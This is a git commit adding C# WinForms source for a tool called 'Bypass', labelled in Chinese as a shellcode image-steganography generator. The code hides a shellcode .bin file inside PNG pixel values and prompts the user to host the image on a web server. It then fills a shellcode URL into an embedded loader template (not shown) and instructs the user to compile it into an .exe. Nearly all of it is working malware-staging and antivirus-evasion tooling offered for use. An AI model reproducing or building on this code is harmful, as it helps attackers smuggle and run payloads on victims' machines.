032242444f09868b976616ce20eb383386d26f33
sshenlian <50750753+sshenlian@users.noreply.github.com>
2022-01-18 00:07:27 +0800

    Add files via upload

---
+++ Bypass/Form1.Designer.cs
@@ -0,0 +1,144 @@
+﻿
+namespace Bypass
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// 必需的设计器变量。
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// 清理所有正在使用的资源。
+        /// </summary>
+        /// <param name="disposing">如果应释放托管资源，为 true；否则为 false。</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows 窗体设计器生成的代码
+
+        /// <summary>
+        /// 设计器支持所需的方法 - 不要修改
+        /// 使用代码编辑器修改此方法的内容。
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.textBox1 = new System.Windows.Forms.TextBox();
+            this.button1 = new System.Windows.Forms.Button();
+            this.label1 = new System.Windows.Forms.Label();
+            this.button2 = new System.Windows.Forms.Button();
+            this.textBox2 = new System.Windows.Forms.TextBox();
+            this.button3 = new System.Windows.Forms.Button();
+            this.label2 = new System.Windows.Forms.Label();
+            this.richTextBox1 = new System.Windows.Forms.RichTextBox();
+            this.SuspendLayout();
+            // 
+            // textBox1
+            // 
+            this.textBox1.Location = new System.Drawing.Point(124, 60);
+            this.textBox1.Name = "textBox1";
+            this.textBox1.Size = new System.Drawing.Size(264, 21);
+            this.textBox1.TabIndex = 0;
+            // 
+            // button1
+            // 
+            this.button1.Location = new System.Drawing.Point(405, 58);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(96, 23);
+            this.button1.TabIndex = 1;
+            this.button1.Text = "shellcode加载";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Location = new System.Drawing.Point(35, 63);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(35, 12);
+            this.label1.TabIndex = 2;
+            this.label1.Text = "File:";
+            // 
+            // button2
+            // 
+            this.button2.Location = new System.Drawing.Point(124, 109);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(103, 23);
+            this.button2.TabIndex = 3;
+            this.button2.Text = "图片文件生成";
+            this.button2.UseVisualStyleBackColor = true;
+            this.button2.Click += new System.EventHandler(this.button2_Click);
+            // 
+            // textBox2
+            // 
+            this.textBox2.Location = new System.Drawing.Point(124, 171);
+            this.textBox2.Name = "textBox2";
+            this.textBox2.Size = new System.Drawing.Size(264, 21);
+            this.textBox2.TabIndex = 4;
+            // 
+            // button3
+            // 
+            this.button3.Location = new System.Drawing.Point(405, 169);
+            this.button3.Name = "button3";
+            this.button3.Size = new System.Drawing.Size(96, 23);
+            this.button3.TabIndex = 5;
+            this.button3.Text = "生成代码";
+            this.button3.UseVisualStyleBackColor = true;
+            this.button3.Click += new System.EventHandler(this.button3_Click);
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Location = new System.Drawing.Point(35, 174);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(83, 12);
+            this.label2.TabIndex = 6;
+            this.label2.Text = "shellcode url";
+            // 
+            // richTextBox1
+            // 
+            this.richTextBox1.Location = new System.Drawing.Point(12, 251);
+            this.richTextBox1.Name = "richTextBox1";
+            this.richTextBox1.Size = new System.Drawing.Size(509, 188);
+            this.richTextBox1.TabIndex = 7;
+            this.richTextBox1.Text = "";
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 12F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(533, 451);
+            this.Controls.Add(this.richTextBox1);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.button3);
+            this.Controls.Add(this.textBox2);
+            this.Controls.Add(this.button2);
+            this.Controls.Add(this.label1);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.textBox1);
+            this.Name = "Form1";
+            this.Text = "shellcode图片隐写生成器";
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.TextBox textBox1;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.Button button2;
+        private System.Windows.Forms.TextBox textBox2;
+        private System.Windows.Forms.Button button3;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.RichTextBox richTextBox1;
+    }
+}
+
---
+++ Bypass/Form1.cs
@@ -0,0 +1,80 @@
+﻿using Bypass.Properties;
+using System;
+using System.Drawing;
+using System.Windows.Forms;
+
+namespace Bypass
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            OpenFileDialog FOpen = new OpenFileDialog()
+            {
+                Filter = "Shellcode|*.bin",
+                InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
+            };
+
+            if (FOpen.ShowDialog() == DialogResult.OK)
+                textBox1.Text = FOpen.FileName;
+        }
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+            string filePath = textBox1.Text;
+            Bitmap img = pixelate(filePath);
+            SaveFileDialog s = new SaveFileDialog();
+            s.DefaultExt = "bmp";
+            s.Filter = "PNG Files|*.png";
+            if (s.ShowDialog() == DialogResult.OK)
+            {
+                img.Save(s.FileName);
+                MessageBox.Show("将文件存放到web服务器","Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
+            }
+        }
+
+        public static Bitmap pixelate(string filePath)
+        {
+            string a = Convert.ToBase64String(System.IO.File.ReadAllBytes(filePath));
+            char[] aR = a.ToCharArray();
+            double sq = Math.Sqrt(aR.Length);
+            int autosize = ((int)sq) + 2;
+            Bitmap imageholder = new Bitmap(autosize, autosize);
+            int fff = 0;
+            for (int y = 1; y <= imageholder.Height - 1; y++)
+            {
+                for (int x = 1; x <= imageholder.Width - 1; x++)
+                {
+                    if (fff <= aR.Length - 1)
+                    {
+                        int charCode = aR[fff];
+                        imageholder.SetPixel(x, y, Color.FromArgb(charCode, 0, 0));
+                        fff++;
+                    }
+                }
+            }
+            return imageholder;
+        }
+
+        private void button3_Click(object sender, EventArgs e)
+        {
+            string Source = Resources.imgcrypt;
+            if (textBox2.Text != "")
+            {
+                Source = Source.Replace("%qwq%", textBox2.Text);
+                richTextBox1.Text = Source;
+                MessageBox.Show("复制到 VS ; 选择 .NET Framework 4.0 ; 生成exe文件","Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
+            }
+            else
+            {
+                MessageBox.Show("请输入URL.",
+                        "Error!", MessageBoxButtons.OK, MessageBoxIcon.Information);
+            }
+        }
+    }
+}
